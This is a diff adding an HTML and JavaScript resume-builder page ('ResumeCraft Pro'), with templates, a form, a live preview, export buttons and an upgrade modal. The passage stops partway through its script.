@@ -1,0 +1,1391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ResumeCraft Pro - AI-Powered Resume Builder</title>
+    
+    <!-- Meta Tags -->
+    <meta name="description" content="Create professional resumes with AI assistance. Free online resume builder with ATS-friendly templates, real-time preview, resume scoring, and instant PDF download.">
+    <meta name="keywords" content="resume builder, CV maker, AI resume, ATS resume, professional resume, online resume, free resume builder, resume templates, CV creator">
+    <meta name="author" content="ResumeCraft Pro">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Open Graph -->
+    <meta property="og:title" content="ResumeCraft Pro - AI-Powered Resume Builder">
+    <meta property="og:description" content="Create ATS-friendly resumes with AI assistance. Modern templates, resume scoring, and instant PDF download.">
+    <meta property="og:image" content="https://picsum.photos/seed/resumecraft/1200/630.jpg">
+    <meta property="og:url" content="https://resumecraft.pro">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="ResumeCraft Pro">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ResumeCraft Pro - AI-Powered Resume Builder">
+    <meta name="twitter:description" content="Create ATS-friendly resumes with AI. Modern templates, resume scoring, and instant PDF download.">
+    <meta name="twitter:image" content="https://picsum.photos/seed/resumecraft/1200/630.jpg">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📄</text></svg>">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- html2pdf for PDF generation -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    
+    <!-- jsPDF for alternative PDF generation -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    
+    <!-- html2canvas for better PDF rendering -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@700&family=Roboto:wght@300;400;500;700&display=swap');
+        
+        * {
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .gradient-bg {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .resume-preview {
+            min-height: 842px;
+            background: white;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .template-modern {
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .template-classic {
+            font-family: 'Georgia', serif;
+        }
+        
+        .template-creative {
+            font-family: 'Playfair Display', serif;
+        }
+        
+        .template-minimal {
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        .animate-float {
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .section-transition {
+            transition: all 0.3s ease;
+        }
+        
+        .section-transition:hover {
+            transform: translateX(5px);
+        }
+        
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .skill-tag {
+            transition: all 0.2s ease;
+        }
+        
+        .skill-tag:hover {
+            transform: scale(1.05);
+        }
+        
+        .score-ring {
+            transform: rotate(-90deg);
+            transform-origin: 50% 50%;
+        }
+        
+        .score-ring-circle {
+            transition: stroke-dashoffset 0.5s ease;
+        }
+        
+        @media print {
+            body * {
+                visibility: hidden;
+            }
+            #resumePreview, #resumePreview * {
+                visibility: visible;
+            }
+            #resumePreview {
+                position: absolute;
+                left: 0;
+                top: 0;
+                width: 100%;
+            }
+        }
+        
+        .color-picker {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .color-picker:hover {
+            transform: scale(1.1);
+        }
+        
+        .photo-upload-area {
+            border: 2px dashed #cbd5e0;
+            transition: all 0.3s;
+        }
+        
+        .photo-upload-area:hover {
+            border-color: #667eea;
+            background-color: #f7fafc;
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 4px;
+        }
+        
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="gradient-bg text-white shadow-lg sticky top-0 z-50">
+        <div class="container mx-auto px-4 py-4">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-10 h-10 bg-white rounded-lg flex items-center justify-center">
+                        <i class="fas fa-file-alt text-purple-600 text-xl"></i>
+                    </div>
+                    <h1 class="text-2xl font-bold">ResumeCraft Pro</h1>
+                    <span class="bg-yellow-400 text-purple-900 px-2 py-1 rounded-full text-xs font-bold">AI POWERED</span>
+                </div>
+                <nav class="hidden md:flex items-center space-x-6">
+                    <button onclick="scrollToSection('builder')" class="hover:text-purple-200 transition">Builder</button>
+                    <button onclick="scrollToSection('templates')" class="hover:text-purple-200 transition">Templates</button>
+                    <button onclick="scrollToSection('analytics')" class="hover:text-purple-200 transition">Analytics</button>
+                    <button onclick="scrollToSection('preview')" class="hover:text-purple-200 transition">Preview</button>
+                    <button onclick="showUpgradeModal()" class="bg-yellow-400 text-purple-900 px-4 py-2 rounded-lg font-semibold hover:bg-yellow-300 transition">
+                        <i class="fas fa-crown mr-2"></i>Upgrade
+                    </button>
+                </nav>
+                <button onclick="toggleMobileMenu()" class="md:hidden">
+                    <i class="fas fa-bars text-2xl"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Mobile Menu -->
+    <div id="mobileMenu" class="hidden fixed inset-0 bg-black bg-opacity-50 z-40">
+        <div class="bg-white w-64 h-full shadow-xl">
+            <div class="p-4">
+                <button onclick="toggleMobileMenu()" class="mb-6">
+                    <i class="fas fa-times text-2xl"></i>
+                </button>
+                <nav class="flex flex-col space-y-4">
+                    <button onclick="scrollToSection('builder'); toggleMobileMenu()" class="text-left py-2">Builder</button>
+                    <button onclick="scrollToSection('templates'); toggleMobileMenu()" class="text-left py-2">Templates</button>
+                    <button onclick="scrollToSection('analytics'); toggleMobileMenu()" class="text-left py-2">Analytics</button>
+                    <button onclick="scrollToSection('preview'); toggleMobileMenu()" class="text-left py-2">Preview</button>
+                    <button onclick="showUpgradeModal(); toggleMobileMenu()" class="bg-yellow-400 text-purple-900 px-4 py-2 rounded-lg">
+                        <i class="fas fa-crown mr-2"></i>Upgrade
+                    </button>
+                </nav>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="gradient-bg text-white py-16">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-4xl md:text-5xl font-bold mb-4 animate-float">
+                Build Your Perfect Resume with AI
+            </h2>
+            <p class="text-xl mb-8 opacity-90">
+                ATS-friendly templates, AI-powered suggestions, resume scoring, and instant download
+            </p>
+            <div class="flex flex-wrap justify-center gap-4">
+                <div class="bg-white bg-opacity-20 rounded-lg px-6 py-3">
+                    <i class="fas fa-robot mr-2"></i>AI Assistant
+                </div>
+                <div class="bg-white bg-opacity-20 rounded-lg px-6 py-3">
+                    <i class="fas fa-chart-line mr-2"></i>Resume Score
+                </div>
+                <div class="bg-white bg-opacity-20 rounded-lg px-6 py-3">
+                    <i class="fas fa-check-circle mr-2"></i>ATS Optimized
+                </div>
+                <div class="bg-white bg-opacity-20 rounded-lg px-6 py-3">
+                    <i class="fas fa-language mr-2"></i>Multi-language
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Resume Score Dashboard -->
+    <section id="analytics" class="container mx-auto px-4 py-8">
+        <div class="glass-effect rounded-xl p-6 mb-8">
+            <h3 class="text-2xl font-bold mb-6 text-gray-800">
+                <i class="fas fa-chart-line text-purple-600 mr-2"></i>Resume Analytics
+            </h3>
+            <div class="grid md:grid-cols-4 gap-6">
+                <div class="text-center">
+                    <div class="relative inline-block">
+                        <svg class="score-ring" width="120" height="120">
+                            <circle cx="60" cy="60" r="50" stroke="#e5e7eb" stroke-width="10" fill="none"/>
+                            <circle id="scoreCircle" class="score-ring-circle" cx="60" cy="60" r="50" 
+                                    stroke="#667eea" stroke-width="10" fill="none"
+                                    stroke-dasharray="314" stroke-dashoffset="78"/>
+                        </svg>
+                        <div class="absolute inset-0 flex items-center justify-center">
+                            <span id="scoreValue" class="text-3xl font-bold text-purple-600">75</span>
+                        </div>
+                    </div>
+                    <p class="mt-2 font-semibold">Overall Score</p>
+                </div>
+                <div class="bg-purple-50 rounded-lg p-4">
+                    <i class="fas fa-file-alt text-purple-600 text-2xl mb-2"></i>
+                    <p class="text-sm text-gray-600">Word Count</p>
+                    <p id="wordCount" class="text-2xl font-bold">0</p>
+                </div>
+                <div class="bg-green-50 rounded-lg p-4">
+                    <i class="fas fa-eye text-green-600 text-2xl mb-2"></i>
+                    <p class="text-sm text-gray-600">ATS Friendly</p>
+                    <p class="text-2xl font-bold text-green-600">Yes</p>
+                </div>
+                <div class="bg-blue-50 rounded-lg p-4">
+                    <i class="fas fa-clock text-blue-600 text-2xl mb-2"></i>
+                    <p class="text-sm text-gray-600">Read Time</p>
+                    <p id="readTime" class="text-2xl font-bold">30s</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 pb-8">
+        <div class="grid lg:grid-cols-3 gap-8">
+            <!-- Left Sidebar - Tools -->
+            <div class="lg:col-span-1 space-y-6">
+                <!-- Quick Actions -->
+                <div class="glass-effect rounded-xl p-6">
+                    <h3 class="text-lg font-bold mb-4 text-gray-800">
+                        <i class="fas fa-magic text-purple-600 mr-2"></i>AI Tools
+                    </h3>
+                    <div class="space-y-3">
+                        <button onclick="generateSummary()" class="w-full bg-purple-100 text-purple-700 px-4 py-2 rounded-lg hover:bg-purple-200 transition">
+                            <i class="fas fa-wand-magic-sparkles mr-2"></i>Generate Summary
+                        </button>
+                        <button onclick="improveWriting()" class="w-full bg-blue-100 text-blue-700 px-4 py-2 rounded-lg hover:bg-blue-200 transition">
+                            <i class="fas fa-pen-fancy mr-2"></i>Improve Writing
+                        </button>
+                        <button onclick="checkATS()" class="w-full bg-green-100 text-green-700 px-4 py-2 rounded-lg hover:bg-green-200 transition">
+                            <i class="fas fa-search mr-2"></i>Check ATS Score
+                        </button>
+                        <button onclick="generateCoverLetter()" class="w-full bg-yellow-100 text-yellow-700 px-4 py-2 rounded-lg hover:bg-yellow-200 transition">
+                            <i class="fas fa-envelope mr-2"></i>Cover Letter
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Color Theme -->
+                <div class="glass-effect rounded-xl p-6">
+                    <h3 class="text-lg font-bold mb-4 text-gray-800">
+                        <i class="fas fa-palette text-purple-600 mr-2"></i>Color Theme
+                    </h3>
+                    <div class="flex gap-3 justify-center">
+                        <div onclick="changeColor('#667eea')" class="color-picker bg-purple-600"></div>
+                        <div onclick="changeColor('#3b82f6')" class="color-picker bg-blue-600"></div>
+                        <div onclick="changeColor('#10b981')" class="color-picker bg-green-600"></div>
+                        <div onclick="changeColor('#f59e0b')" class="color-picker bg-yellow-600"></div>
+                        <div onclick="changeColor('#ef4444')" class="color-picker bg-red-600"></div>
+                        <div onclick="changeColor('#6b7280')" class="color-picker bg-gray-600"></div>
+                    </div>
+                </div>
+
+                <!-- Language -->
+                <div class="glass-effect rounded-xl p-6">
+                    <h3 class="text-lg font-bold mb-4 text-gray-800">
+                        <i class="fas fa-language text-purple-600 mr-2"></i>Language
+                    </h3>
+                    <select id="languageSelect" onchange="changeLanguage()" class="w-full px-4 py-2 border border-gray-300 rounded-lg">
+                        <option value="en">English</option>
+                        <option value="bn">বাংলা</option>
+                        <option value="es">Español</option>
+                        <option value="fr">Français</option>
+                        <option value="de">Deutsch</option>
+                    </select>
+                </div>
+
+                <!-- Export Options -->
+                <div class="glass-effect rounded-xl p-6">
+                    <h3 class="text-lg font-bold mb-4 text-gray-800">
+                        <i class="fas fa-download text-purple-600 mr-2"></i>Export Options
+                    </h3>
+                    <div class="space-y-3">
+                        <button onclick="downloadPDF()" class="w-full bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 transition">
+                            <i class="fas fa-file-pdf mr-2"></i>Download PDF
+                        </button>
+                        <button onclick="downloadDOCX()" class="w-full bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition">
+                            <i class="fas fa-file-word mr-2"></i>Download DOCX
+                        </button>
+                        <button onclick="shareResume()" class="w-full bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition">
+                            <i class="fas fa-share-alt mr-2"></i>Share Link
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Middle Column - Builder -->
+            <div id="builder" class="lg:col-span-1 space-y-6 custom-scrollbar" style="max-height: 80vh; overflow-y: auto;">
+                <!-- Template Selection -->
+                <div id="templates" class="glass-effect rounded-xl p-6">
+                    <h3 class="text-xl font-bold mb-4 text-gray-800">
+                        <i class="fas fa-palette text-purple-600 mr-2"></i>Choose Template
+                    </h3>
+                    <div class="grid grid-cols-2 gap-3">
+                        <button onclick="changeTemplate('modern')" class="template-btn p-3 rounded-lg border-2 border-purple-600 bg-purple-50 hover:bg-purple-100 transition">
+                            <i class="fas fa-laptop text-xl text-purple-600 mb-1"></i>
+                            <p class="text-xs font-semibold">Modern</p>
+                        </button>
+                        <button onclick="changeTemplate('classic')" class="template-btn p-3 rounded-lg border-2 border-gray-300 hover:border-purple-600 hover:bg-purple-50 transition">
+                            <i class="fas fa-briefcase text-xl text-gray-600 mb-1"></i>
+                            <p class="text-xs font-semibold">Classic</p>
+                        </button>
+                        <button onclick="changeTemplate('creative')" class="template-btn p-3 rounded-lg border-2 border-gray-300 hover:border-purple-600 hover:bg-purple-50 transition">
+                            <i class="fas fa-paint-brush text-xl text-gray-600 mb-1"></i>
+                            <p class="text-xs font-semibold">Creative</p>
+                        </button>
+                        <button onclick="changeTemplate('minimal')" class="template-btn p-3 rounded-lg border-2 border-gray-300 hover:border-purple-600 hover:bg-purple-50 transition">
+                            <i class="fas fa-minus text-xl text-gray-600 mb-1"></i>
+                            <p class="text-xs font-semibold">Minimal</p>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Photo Upload -->
+                <div class="glass-effect rounded-xl p-6">
+                    <h3 class="text-xl font-bold mb-4 text-gray-800">
+                        <i class="fas fa-camera text-purple-600 mr-2"></i>Profile Photo
+                    </h3>
+                    <div class="photo-upload-area rounded-lg p-8 text-center cursor-pointer" onclick="document.getElementById('photoInput').click()">
+                        <div id="photoPreview" class="mb-4">
+                            <i class="fas fa-user-circle text-6xl text-gray-400"></i>
+                        </div>
+                        <p class="text-sm text-gray-600">Click to upload photo</p>
+                        <p class="text-xs text-gray-500 mt-1">JPG, PNG up to 2MB</p>
+                        <input type="file" id="photoInput" accept="image/*" onchange="handlePhotoUpload(event)" class="hidden">
+                    </div>
+                </div>
+
+                <!-- Personal Information -->
+                <div class="glass-effect rounded-xl p-6 section-transition">
+                    <h3 class="text-xl font-bold mb-4 text-gray-800">
+                        <i class="fas fa-user text-purple-600 mr-2"></i>Personal Information
+                    </h3>
+                    <div class="space-y-3">
+                        <input type="text" id="fullName" placeholder="Full Name" 
+                               class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                               oninput="updatePreview()">
+                        <input type="text" id="jobTitle" placeholder="Job Title" 
+                               class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                               oninput="updatePreview()">
+                        <input type="email" id="email" placeholder="Email" 
+                               class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                               oninput="updatePreview()">
+                        <input type="tel" id="phone" placeholder="Phone" 
+                               class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                               oninput="updatePreview()">
+                        <input type="text" id="location" placeholder="Location" 
+                               class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                               oninput="updatePreview()">
+                        <input type="text" id="website" placeholder="Website/Portfolio" 
+                               class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                               oninput="updatePreview()">
+                        <textarea id="summary" placeholder="Professional Summary" rows="3" 
+                                  class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                                  oninput="updatePreview()"></textarea>
+                    </div>
+                </div>
+
+                <!-- Work Experience -->
+                <div class="glass-effect rounded-xl p-6 section-transition">
+                    <h3 class="text-xl font-bold mb-4 text-gray-800">
+                        <i class="fas fa-briefcase text-purple-600 mr-2"></i>Work Experience
+                    </h3>
+                    <div id="experienceList" class="space-y-4">
+                        <div class="experience-item border-l-4 border-purple-600 pl-4">
+                            <input type="text" placeholder="Job Title" 
+                                   class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                   oninput="updatePreview()">
+                            <input type="text" placeholder="Company" 
+                                   class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                   oninput="updatePreview()">
+                            <div class="grid grid-cols-2 gap-2 mb-2">
+                                <input type="text" placeholder="Start Date" 
+                                       class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                       oninput="updatePreview()">
+                                <input type="text" placeholder="End Date" 
+                                       class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                       oninput="updatePreview()">
+                            </div>
+                            <textarea placeholder="Description (use bullet points with •)" rows="3" 
+                                      class="w-full px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                      oninput="updatePreview()"></textarea>
+                        </div>
+                    </div>
+                    <button onclick="addExperience()" class="mt-4 text-purple-600 hover:text-purple-700 font-semibold">
+                        <i class="fas fa-plus-circle mr-2"></i>Add Experience
+                    </button>
+                </div>
+
+                <!-- Education -->
+                <div class="glass-effect rounded-xl p-6 section-transition">
+                    <h3 class="text-xl font-bold mb-4 text-gray-800">
+                        <i class="fas fa-graduation-cap text-purple-600 mr-2"></i>Education
+                    </h3>
+                    <div id="educationList" class="space-y-4">
+                        <div class="education-item border-l-4 border-purple-600 pl-4">
+                            <input type="text" placeholder="Degree" 
+                                   class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                   oninput="updatePreview()">
+                            <input type="text" placeholder="Institution" 
+                                   class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                   oninput="updatePreview()">
+                            <input type="text" placeholder="Location" 
+                                   class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                   oninput="updatePreview()">
+                            <div class="grid grid-cols-2 gap-2">
+                                <input type="text" placeholder="Start Year" 
+                                       class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                       oninput="updatePreview()">
+                                <input type="text" placeholder="End Year" 
+                                       class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                       oninput="updatePreview()">
+                            </div>
+                        </div>
+                    </div>
+                    <button onclick="addEducation()" class="mt-4 text-purple-600 hover:text-purple-700 font-semibold">
+                        <i class="fas fa-plus-circle mr-2"></i>Add Education
+                    </button>
+                </div>
+
+                <!-- Skills -->
+                <div class="glass-effect rounded-xl p-6 section-transition">
+                    <h3 class="text-xl font-bold mb-4 text-gray-800">
+                        <i class="fas fa-tools text-purple-600 mr-2"></i>Skills
+                    </h3>
+                    <div class="mb-4">
+                        <label class="text-sm text-gray-600 mb-2 block">Skill Categories</label>
+                        <div class="space-y-2">
+                            <div>
+                                <input type="text" placeholder="Technical Skills (e.g., JavaScript, Python)" 
+                                       class="w-full px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                       oninput="updatePreview()">
+                            </div>
+                            <div>
+                                <input type="text" placeholder="Soft Skills (e.g., Leadership, Communication)" 
+                                       class="w-full px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                       oninput="updatePreview()">
+                            </div>
+                            <div>
+                                <input type="text" placeholder="Languages (e.g., English, Spanish)" 
+                                       class="w-full px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                                       oninput="updatePreview()">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="flex flex-wrap gap-2 mb-4" id="skillsList">
+                        <span class="skill-tag bg-purple-100 text-purple-700 px-3 py-1 rounded-full text-sm">
+                            JavaScript <button onclick="this.parentElement.remove()" class="ml-2 hover:text-purple-900">×</button>
+                        </span>
+                        <span class="skill-tag bg-purple-100 text-purple-700 px-3 py-1 rounded-full text-sm">
+                            React <button onclick="this.parentElement.remove()" class="ml-2 hover:text-purple-900">×</button>
+                        </span>
+                    </div>
+                    <div class="flex gap-2">
+                        <input type="text" id="skillInput" placeholder="Add a skill" 
+                               class="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:border-purple-500 transition"
+                               onkeypress="if(event.key==='Enter') addSkill()">
+                        <button onclick="addSkill()" class="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 transition">
+                            <i class="fas fa-plus"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Custom Sections -->
+                <div class="glass-effect rounded-xl p-6 section-transition">
+                    <h3 class="text-xl font-bold mb-4 text-gray-800">
+                        <i class="fas fa-plus-square text-purple-600 mr-2"></i>Custom Sections
+                    </h3>
+                    <div class="space-y-3">
+                        <button onclick="addCustomSection('Projects')" class="w-full text-left bg-gray-100 px-4 py-2 rounded-lg hover:bg-gray-200 transition">
+                            <i class="fas fa-project-diagram mr-2"></i>Add Projects
+                        </button>
+                        <button onclick="addCustomSection('Certifications')" class="w-full text-left bg-gray-100 px-4 py-2 rounded-lg hover:bg-gray-200 transition">
+                            <i class="fas fa-certificate mr-2"></i>Add Certifications
+                        </button>
+                        <button onclick="addCustomSection('Awards')" class="w-full text-left bg-gray-100 px-4 py-2 rounded-lg hover:bg-gray-200 transition">
+                            <i class="fas fa-trophy mr-2"></i>Add Awards
+                        </button>
+                        <button onclick="addCustomSection('Publications')" class="w-full text-left bg-gray-100 px-4 py-2 rounded-lg hover:bg-gray-200 transition">
+                            <i class="fas fa-book mr-2"></i>Add Publications
+                        </button>
+                    </div>
+                    <div id="customSections" class="mt-4 space-y-4"></div>
+                </div>
+            </div>
+
+            <!-- Right Column - Preview -->
+            <div id="preview" class="lg:col-span-1">
+                <div class="glass-effect rounded-xl p-6 sticky top-24">
+                    <div class="flex justify-between items-center mb-4">
+                        <h3 class="text-xl font-bold text-gray-800">
+                            <i class="fas fa-eye text-purple-600 mr-2"></i>Live Preview
+                        </h3>
+                        <div class="flex gap-2">
+                            <button onclick="zoomIn()" class="text-gray-600 hover:text-gray-800">
+                                <i class="fas fa-search-plus"></i>
+                            </button>
+                            <button onclick="zoomOut()" class="text-gray-600 hover:text-gray-800">
+                                <i class="fas fa-search-minus"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <div id="resumePreview" class="resume-preview rounded-lg overflow-hidden template-modern" style="transform: scale(1); transform-origin: top left;">
+                        <!-- Resume content will be dynamically generated here -->
+                    </div>
+                    <div class="mt-4 grid grid-cols-2 gap-2">
+                        <button onclick="downloadPDF()" class="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 transition">
+                            <i class="fas fa-download mr-2"></i>PDF
+                        </button>
+                        <button onclick="window.print()" class="bg-gray-600 text-white px-4 py-2 rounded-lg hover:bg-gray-700 transition">
+                            <i class="fas fa-print mr-2"></i>Print
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Upgrade Modal -->
+    <div id="upgradeModal" class="hidden fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-xl max-w-md w-full p-6">
+            <h3 class="text-2xl font-bold mb-4">Upgrade to Pro</h3>
+            <div class="space-y-3 mb-6">
+                <div class="flex items-center">
+                    <i class="fas fa-check text-green-500 mr-3"></i>
+                    <span>Unlimited resume downloads</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-check text-green-500 mr-3"></i>
+                    <span>Premium templates</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-check text-green-500 mr-3"></i>
+                    <span>AI-powered suggestions</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-check text-green-500 mr-3"></i>
+                    <span>Cover letter builder</span>
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-check text-green-500 mr-3"></i>
+                    <span>Priority support</span>
+                </div>
+            </div>
+            <div class="text-center mb-4">
+                <p class="text-3xl font-bold">$9.99<span class="text-lg text-gray-600">/month</span></p>
+            </div>
+            <div class="flex gap-3">
+                <button onclick="closeUpgradeModal()" class="flex-1 bg-gray-200 text-gray-800 px-4 py-2 rounded-lg hover:bg-gray-300 transition">
+                    Maybe Later
+                </button>
+                <button onclick="processUpgrade()" class="flex-1 bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 transition">
+                    Upgrade Now
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center">
+        <div class="bg-white rounded-lg p-8 text-center">
+            <div class="loading-spinner mx-auto mb-4"></div>
+            <p class="text-lg font-semibold">Processing...</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="gradient-bg text-white mt-16 py-8">
+        <div class="container mx-auto px-4 text-center">
+            <p class="mb-2">© 2024 ResumeCraft Pro. All rights reserved.</p>
+            <div class="flex justify-center space-x-4">
+                <a href="#" class="hover:text-purple-200 transition"><i class="fab fa-twitter"></i></a>
+                <a href="#" class="hover:text-purple-200 transition"><i class="fab fa-linkedin"></i></a>
+                <a href="#" class="hover:text-purple-200 transition"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        let currentTemplate = 'modern';
+        let currentColor = '#667eea';
+        let zoomLevel = 1;
+        let profilePhoto = null;
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            updatePreview();
+            updateAnalytics();
+        });
+        
+        // Toggle mobile menu
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobileMenu');
+            menu.classList.toggle('hidden');
+        }
+        
+        // Scroll to section
+        function scrollToSection(sectionId) {
+            document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        // Change template
+        function changeTemplate(template) {
+            currentTemplate = template;
+            const preview = document.getElementById('resumePreview');
+            preview.className = `resume-preview rounded-lg overflow-hidden template-${template}`;
+            
+            // Update button styles
+            document.querySelectorAll('.template-btn').forEach(btn => {
+                btn.classList.remove('border-purple-600', 'bg-purple-50');
+                btn.classList.add('border-gray-300');
+            });
+            event.target.closest('.template-btn').classList.remove('border-gray-300');
+            event.target.closest('.template-btn').classList.add('border-purple-600', 'bg-purple-50');
+            
+            updatePreview();
+        }
+        
+        // Change color theme
+        function changeColor(color) {
+            currentColor = color;
+            document.documentElement.style.setProperty('--primary-color', color);
+            updatePreview();
+        }
+        
+        // Handle photo upload
+        function handlePhotoUpload(event) {
+            const file = event.target.files[0];
+            if (file && file.size <= 2 * 1024 * 1024) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    profilePhoto = e.target.result;
+                    document.getElementById('photoPreview').innerHTML = 
+                        `<img src="${profilePhoto}" class="w-24 h-24 rounded-full mx-auto object-cover">`;
+                    updatePreview();
+                };
+                reader.readAsDataURL(file);
+            } else {
+                alert('Please select an image under 2MB');
+            }
+        }
+        
+        // Add experience
+        function addExperience() {
+            const container = document.getElementById('experienceList');
+            const newExp = document.createElement('div');
+            newExp.className = 'experience-item border-l-4 border-purple-600 pl-4';
+            newExp.innerHTML = `
+                <input type="text" placeholder="Job Title" 
+                       class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                       oninput="updatePreview()">
+                <input type="text" placeholder="Company" 
+                       class="w-full mb-2 px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                       oninput="updatePreview()">
+                <div class="grid grid-cols-2 gap-2 mb-2">
+                    <input type="text" placeholder="Start Date" 
+                           class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                           oninput="updatePreview()">
+                    <input type="text" placeholder="End Date" 
+                           class="px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                           oninput="updatePreview()">
+                </div>
+                <textarea placeholder="Description (use bullet points with •)" rows="3" 
+                          class="w-full px-3 py-1 border border-gray-300 rounded focus:border-purple-500 transition"
+                          oninput="updatePreview()"></textarea>
